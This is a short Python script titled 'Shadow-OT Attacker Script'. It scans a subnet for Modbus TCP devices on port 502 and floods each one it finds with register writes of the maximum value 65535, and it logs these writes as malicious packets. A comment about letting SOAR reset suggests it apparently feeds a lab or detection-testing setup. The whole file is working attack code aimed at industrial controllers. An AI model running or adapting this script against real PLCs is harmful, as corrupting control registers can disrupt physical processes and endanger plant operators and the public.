import argparse
import socket
import ipaddress
import time
from datetime import datetime
from pymodbus.client.sync import ModbusTcpClient

time.sleep(2)  # give SOAR time to reset before attack starts

def log(msg: str):
    print(f"[{datetime.now().isoformat()}] {msg}")

def scan_network(subnet: str, port: int = 502) -> list[str]:
    log(f"Scanning subnet {subnet} for port {port}...")
    active_hosts = []
    network = ipaddress.ip_network(subnet)
    
    # Simple socket connect scan
    for ip in network.hosts():
        ip_str = str(ip)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1) # fast timeout for local network
                if s.connect_ex((ip_str, port)) == 0:
                    active_hosts.append(ip_str)
                    log(f"Found open port {port} on {ip_str}")
        except Exception:
            pass
            
    log(f"Scan complete. Found {len(active_hosts)} Modbus targets.")
    return active_hosts

def attack_plc(ip: str):
    log(f"Connecting to target {ip}...")
    client = ModbusTcpClient(ip)
    
    if not client.connect():
        log(f"Failed to connect to {ip}")
        return

    log(f"Executing AGGRESSIVE ATTACK on {ip}...")
    for i in range(50):
        # Function 16, High Register (800), High Value (65535), Rapid (no sleep)
        client.write_registers(800 + (i % 10), [65535] * 5, slave=0)
        if i % 10 == 0:
            log(f"Sent {i} malicious packets...")
        
    client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Shadow-OT Attacker Script")
    parser.add_argument("--target", type=str, help="Specific IP to attack. If omitted, scans 10.5.0.0/24")
    parser.add_argument("--subnet", type=str, default="10.5.0.0/24", help="Subnet to scan")
    
    args = parser.parse_args()
    
    if args.target:
        targets = [args.target]
    else:
        targets = scan_network(args.subnet)
        
    for target in targets:
        attack_plc(target)
        time.sleep(1)
